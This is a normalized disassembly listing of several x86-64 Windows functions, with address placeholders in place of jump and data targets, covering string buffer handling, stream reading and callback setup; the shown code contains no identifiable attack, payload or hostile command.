mov [ rdi ] rax
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
mov rdx r15
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
inc rsi
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
mov [ rax + r14 ] 0x0
mov [ rbp - 0x48 ] rbx
lea rax [ rbp - 0x58 ]
cmp [ rbp - 0x40 ] 0x10
cmovae rax [ rbp - 0x58 ]
mov [ rax + rbx ] 0x0
mov r12 [ rbp - 0x40 ]
mov r14 [ rbp - 0x48 ]
mov r13 [ rbp - 0x58 ]
movzx ecx r13w
add ecx 0x9
movzx eax [ rdi + 0xa ]
cmp eax ecx
jg r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
cmp [ rdi + 0x8 ] sil
jne r-xdata
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
inc r12
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0x8 ] sil
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp esi 0x8
jge r-xdata
mov [ rdi ] r14
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi + 0x8 ] sil
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rsp + 0x30 ] 0x1
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov rdx r15
mov rcx rdi
call sub_1400219d0
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi ] r14
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
movzx eax [ rdi + 0xa ]
sub al r13b
add al 0x30
mov [ r12 ] al
inc r12
inc esi
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi ] r14
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rdx r15
mov rcx rdi
call sub_1400219d0
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_1400212e0
push rbx
sub rsp 0x20
cmp [ rcx + 0x8 ] 0x0
mov rbx rcx
jne r-xdata
movzx eax [ rcx + 0xa ]
add rsp 0x20
pop rbx
retn
mov rcx [ rcx ]
test rcx rcx
je r-xdata
movzx eax [ rbx + 0xa ]
mov [ rbx ] 0x0
mov [ rbx + 0x8 ] 0x1
add rsp 0x20
pop rbx
retn
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rbx + 0xa ] ax
mov [ rbx + 0x8 ] 0x1
add rsp 0x20
pop rbx
retn
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_140021350
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
mov [ rbx ] 0x0
mov [ rbx + 0x8 ] 0x1
mov rax rbx
add rsp 0x20
pop rbx
retn
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rbx + 0x8 ] 0x0
mov rax rbx
add rsp 0x20
pop rbx
retn
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_1400213c0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
movzx esi r8b
mov rdi rdx
mov rbx rcx
cmp rdx 0xffffffffffffffff
jne r-xdata
cmp rdx 0xfffffffffffffffe
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rax [ rcx + 0x18 ]
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test rdx rdx
jne r-xdata
mov r8 [ rcx + 0x10 ]
call sub_1400061b0
test rdi rdi
je r-xdata
mov [ rcx + 0x10 ] rdx
cmp rax 0x10
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp rdi 0x1
jne r-xdata
mov rax rcx
mov [ rcx ] 0x0
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rcx ]
mov [ rax ] dl
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx ] sil
jmp r-xdata
mov rax [ rbx ]
mov [ rax ] sil
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
movsx edx sil
mov r8 rdi
call sub_14003d760
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_1400214c0
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_14003825c
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
call sub_140037e88
cmp rdi [ rax + 0x18 ]
jae r-xdata
lea rcx [ rsp + 0x68 ]
call sub_14003828c
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
test rsi rsi
je r-xdata
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
cmp [ rcx + 0x24 ] 0x0
je r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_1400218b0
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003a7f8
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
int3
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rcx rbx
call sub_140037db8
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_140021610
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x70
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0xc0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov rdi r8
mov [ rsp + 0x28 ] rdx
mov rsi rcx
mov r13d 0x2
xor r9d r9d
movzx r10d [ r8 ]
test r10w r10w
je r-xdata
mov [ rsp + 0x50 ] 0xf
mov [ rsp + 0x48 ] 0x0
mov [ rsp + 0x38 ] 0x0
xor r8d r8d
mov rdx r13
lea rcx [ rsp + 0x38 ]
call sub_1400213c0
nop
mov eax 0xfffffffe
lea r12d [ rax + 0x3 ]
mov r15 [ rsp + 0x50 ]
movzx eax r10w
cmp r15 0x10
jb r-xdata
movzx eax [ rdi + rbx * 2 ]
test ax ax
je r-xdata
inc r9
movzx eax [ r8 + r9 * 2 ]
test ax ax
jne r-xdata
inc r13
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xc0 ]
add rsp 0x70
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rsp + 0x38 ]
call j_sub_14003ad04
mov eax [ rsp + 0x20 ]
lea rax [ rsp + 0x38 ]
cmp r15 0x10
mov rcx [ rsp + 0x38 ]
cmovae rax rcx
cmp [ rax + rbp ] 0x0
je r-xdata
movzx ecx [ rdi ]
nop
cmp ax r10w
jne r-xdata
add rbx r12
movzx eax [ rdi + rbx * 2 ]
cmp ax [ rdi ]
je r-xdata
lea rax [ rsp + 0x38 ]
cmp r15 0x10
cmovae rax rcx
movsx rax [ rax + rbp ]
add rbx rax
mov eax [ rsp + 0x20 ]
jmp r-xdata
inc rbx
movzx eax [ rdi + rbx * 2 ]
test ax ax
jne r-xdata
lea rdx [ rsp + 0x38 ]
cmp r15 0x10
cmovae rdx rcx
mov ecx 0x7f
movzx eax r12b
cmp r12 rcx
cmovb ecx eax
mov eax ebp
mov [ rsp + 0x20 ] eax
test ax ax
je r-xdata
inc rbp
cmp rbp r13
jb r-xdata
cmp ax cx
je r-xdata
test r14b r14b
je r-xdata
mov rdx [ rsp + 0x28 ]
mov rcx rsi
call sub_1400219d0
test al al
jne r-xdata
mov rdx [ rsp + 0x28 ]
mov rcx rsi
call sub_1400219d0
test al al
jne r-xdata
lea rdx [ rsp + 0x38 ]
cmp r15 0x10
cmovae rdx [ rsp + 0x38 ]
mov ecx 0x7f
movzx eax r12b
cmp r12 rcx
cmovb ecx eax
mov eax [ rsp + 0x20 ]
jmp r-xdata
cmp [ rsi + 0x8 ] al
jne r-xdata
mov eax [ rsp + 0x20 ]
inc r12
mov rcx [ rsi ]
test rcx rcx
je r-xdata
mov [ rdx + rbp ] cl
mov r15 [ rsp + 0x50 ]
movzx eax [ rsi + 0xa ]
cmp [ rdi + rbx * 2 ] ax
jne r-xdata
mov rcx [ rsi ]
test rcx rcx
je r-xdata
mov [ rsi ] 0x0
mov [ rsi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov r14b 0x1
mov eax [ rsp + 0x20 ]
jmp r-xdata
mov [ rsi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rsp + 0x20 ] eax
xor r14b r14b
xor ebx ebx
xor ebp ebp
test r13 r13
je r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rsi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rsi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rsi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_1400218b0
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov rbp rdx
mov rsi rcx
xor r12d r12d
mov edi r12d
mov [ rsp + 0x90 ] r12d
cmp [ rcx ] rdi
jne r-xdata
mov eax 0x4
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
lea ecx [ r12 + 0x18 ]
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x90 ] rax
test rax rax
je r-xdata
mov rbx r12
mov rax [ rbp ]
mov rdx [ rax + 0x28 ]
test rdx rdx
jne r-xdata
lea rcx [ rsp + 0x28 ]
call sub_140037f70
nop
mov rcx [ rsp + 0x60 ]
test rcx rcx
je r-xdata
lea rcx [ rsp + 0x28 ]
call sub_140002990
mov edi 0x1
mov [ rbx + 0x8 ] r12
lea rax [ r--data ]
mov [ rbx ] rax
call sub_140037a98
mov [ rbx + 0x10 ] rax
jmp r-xdata
lea rdx [ rax + 0x30 ]
mov [ rsp + 0x60 ] r12
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsi ] rbx
test dil 0x1
je r-xdata
mov [ rsp + 0x50 ] r12
mov rcx [ rsp + 0x40 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsp + 0x40 ] r12
mov rcx [ rsp + 0x30 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsp + 0x30 ] r12
lea rcx [ rsp + 0x28 ]
call sub_14003828c
call sub_14003ad04
sub_1400219d0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
cmp [ rcx + 0x8 ] 0x0
mov rbx rdx
mov rdi rcx
mov ebp 0xffff
jne r-xdata
cmp [ rbx + 0x8 ] 0x0
jne r-xdata
mov rcx [ rcx ]
test rcx rcx
je r-xdata
cmp [ rdi ] 0x0
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
cmp [ rbx ] 0x0
je r-xdata
cmp [ rbx ] 0x0
je r-xdata
mov [ rbx ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
xor al al
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov al 0x1
add rsp 0x20
pop rdi
retn
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rbx + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
cmp bp ax
je r-xdata
mov [ rbx + 0x8 ] 0x1
cmp bp ax
je r-xdata
sub_140021ab0
mov rax rsp
push rbp
lea rbp [ rax - 0xd8 ]
sub rsp 0x1d0
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0xc0 ] rax
mov rbx rcx
mov [ rsp + 0x30 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
lea rax [ sub_140021e90 ]
mov [ rbp ] rax
mov esi 0x7
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x8 ] di
mov rcx [ r--data ]
mov [ rbp + 0x8 ] rcx
mov eax [ r--data ]
mov [ rbp + 0x10 ] eax
movzx eax [ r--data ]
mov [ rbp + 0x14 ] ax
mov [ rbp + 0x18 ] rsi
lea rax [ rbp + 0x8 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xe ] di
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x3b ]
lea rcx [ rbp + 0x30 ]
call sub_1400025a0
lea rcx [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rcx [ rbp + 0x30 ]
lea r8d [ rdi + 0x76 ]
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp + 0x40 ] 0x3b
lea rax [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rax [ rbp + 0x30 ]
mov [ rax + 0x76 ] di
lea rdx [ rbp ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140021f90 ]
mov [ rbp - 0x60 ] r11
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x58 ] di
mov eax [ r--data ]
mov [ rbp - 0x58 ] eax
movzx eax [ r--data ]
mov [ rbp - 0x54 ] ax
mov [ rbp - 0x48 ] 0x3
lea rax [ rbp - 0x58 ]
cmp rsi 0x8
cmovae rax [ rbp - 0x58 ]
mov [ rax + 0x6 ] di
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x31 ]
lea rcx [ rbp - 0x30 ]
call sub_1400025a0
lea rcx [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rcx [ rbp - 0x30 ]
lea r8d [ rdi + 0x62 ]
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp - 0x20 ] 0x31
lea rax [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rax [ rbp - 0x30 ]
mov [ rax + 0x62 ] di
lea rdx [ rbp - 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140022090 ]
mov [ rsp + 0x40 ] r11
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x48 ] di
mov rcx [ r--data ]
mov [ rsp + 0x48 ] rcx
mov eax [ r--data ]
mov [ rsp + 0x50 ] eax
movzx eax [ r--data ]
mov [ rsp + 0x54 ] ax
mov [ rsp + 0x58 ] rsi
lea rax [ rsp + 0x48 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xe ] di
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
xor r8d r8d
lea edx [ rdi + 0x37 ]
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
lea rcx [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rcx [ rsp + 0x70 ]
lea r8d [ rdi + 0x6e ]
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp - 0x80 ] 0x37
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + 0x6e ] di
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140022190 ]
mov [ rbp + 0x60 ] r11
mov [ rbp + 0x80 ] rsi
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
lea r8d [ rdi + 0x5 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x68 ]
call sub_140001ea0
nop
mov [ rbp + 0xa8 ] rsi
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
lea r8d [ rdi + 0x22 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x90 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x60 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp + 0xa8 ] 0x8
jb r-xdata
mov [ rbp + 0xa8 ] rsi
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x90 ]
call j_sub_14003ad04
mov [ rbp + 0x80 ] rsi
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_14003ad04
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_14003ad04
mov rax rbx
mov rcx [ rbp + 0xc0 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x1d0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x8 ]
call j_sub_14003ad04
sub_140021e90
mov r11 rsp
push rbx
sub rsp 0xa0
mov [ rsp + 0x70 ] 0xfffffffffffffffe
lea rax [ rsp + 0x20 ]
mov [ r11 + 0x10 ] rax
lea rax [ r11 - 0x60 ]
mov [ r11 + 0x18 ] rax
mov [ r11 - 0x70 ] 0x7
xor ebx ebx
mov [ r11 - 0x78 ] rbx
mov [ rsp + 0x20 ] bx
lea r8d [ rbx + 0x14 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
call sub_140001ea0
nop
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x48 ] bx
lea r8d [ rbx + 0x14 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x48 ]
call sub_140001ea0
nop
mov [ rsp + 0x90 ] 0x7
mov [ rsp + 0x88 ] rbx
mov [ rsp + 0x78 ] bx
lea r8d [ rbx + 0xb ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x78 ]
call sub_140001ea0
nop
lea r8 [ rsp + 0x20 ]
lea rdx [ rsp + 0x48 ]
lea rcx [ rsp + 0x78 ]
call sub_140022eb0
lea rcx [ r--data ]
lea rbx [ r--data ]
test al al
cmovne rbx rcx
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_140004ed0
mov rcx rax
call sub_140007970
mov al 0x1
add rsp 0xa0
pop rbx
retn
sub_140021f90
mov r11 rsp
push rbx
sub rsp 0xa0
mov [ rsp + 0x70 ] 0xfffffffffffffffe
lea rax [ rsp + 0x20 ]
mov [ r11 + 0x10 ] rax
lea rax [ r11 - 0x60 ]
mov [ r11 + 0x18 ] rax
mov [ r11 - 0x70 ] 0x7
xor ebx ebx
mov [ r11 - 0x78 ] rbx
mov [ rsp + 0x20 ] bx
lea r8d [ rbx + 0xa ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
call sub_140001ea0
nop
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x48 ] bx
lea r8d [ rbx + 0xa ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x48 ]
call sub_140001ea0
nop
mov [ rsp + 0x90 ] 0x7
mov [ rsp + 0x88 ] rbx
mov [ rsp + 0x78 ] bx
lea r8d [ rbx + 0x7 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x78 ]
call sub_140001ea0
nop
lea r8 [ rsp + 0x20 ]
lea rdx [ rsp + 0x48 ]
lea rcx [ rsp + 0x78 ]
call sub_140022eb0
lea rcx [ r--data ]
lea rbx [ r--data ]
test al al
cmovne rbx rcx
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_140004ed0
mov rcx rax
call sub_140007970
mov al 0x1
add rsp 0xa0
pop rbx
retn
sub_140022090
mov r11 rsp
push rbx
sub rsp 0xa0
mov [ rsp + 0x70 ] 0xfffffffffffffffe
lea rax [ rsp + 0x20 ]
mov [ r11 + 0x10 ] rax
lea rax [ r11 - 0x60 ]
mov [ r11 + 0x18 ] rax
mov [ r11 - 0x70 ] 0x7
xor ebx ebx
mov [ r11 - 0x78 ] rbx
mov [ rsp + 0x20 ] bx
lea r8d [ rbx + 0xe ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
call sub_140001ea0
nop
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x48 ] bx
lea r8d [ rbx + 0xe ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x48 ]
call sub_140001ea0
nop
mov [ rsp + 0x90 ] 0x7
mov [ rsp + 0x88 ] rbx
mov [ rsp + 0x78 ] bx
lea r8d [ rbx + 0xb ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x78 ]
call sub_140001ea0
nop
lea r8 [ rsp + 0x20 ]
lea rdx [ rsp + 0x48 ]
lea rcx [ rsp + 0x78 ]
call sub_140022eb0
lea rcx [ r--data ]
lea rbx [ r--data ]
test al al
cmovne rbx rcx
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_140004ed0
mov rcx rax
call sub_140007970
mov al 0x1
add rsp 0xa0
pop rbx
retn
sub_140022190
mov rax rsp
push rbp
lea rbp [ rax - 0x38 ]
sub rsp 0x130
mov [ rbp - 0x38 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x20 ] rax
mov rax [ r--data ]
mov [ rbp + 0x10 ] rax
movzx eax [ r--data ]
mov [ rbp + 0x18 ] ax
movzx eax [ r--data ]
mov [ rbp + 0x1a ] al
mov rax [ r--data ]
mov [ rbp ] rax
movzx eax [ r--data ]
mov [ rbp + 0x8 ] ax
movzx eax [ r--data ]
mov [ rbp + 0xa ] al
mov [ rbp - 0x10 ] 0x7
xor esi esi
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x28 ] si
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x48 ] si
lea r8d [ rsi + 0x13 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x48 ]
call sub_140001ea0
lea rdx [ rbp - 0x28 ]
lea rcx [ rsp + 0x48 ]
call sub_1400223f0
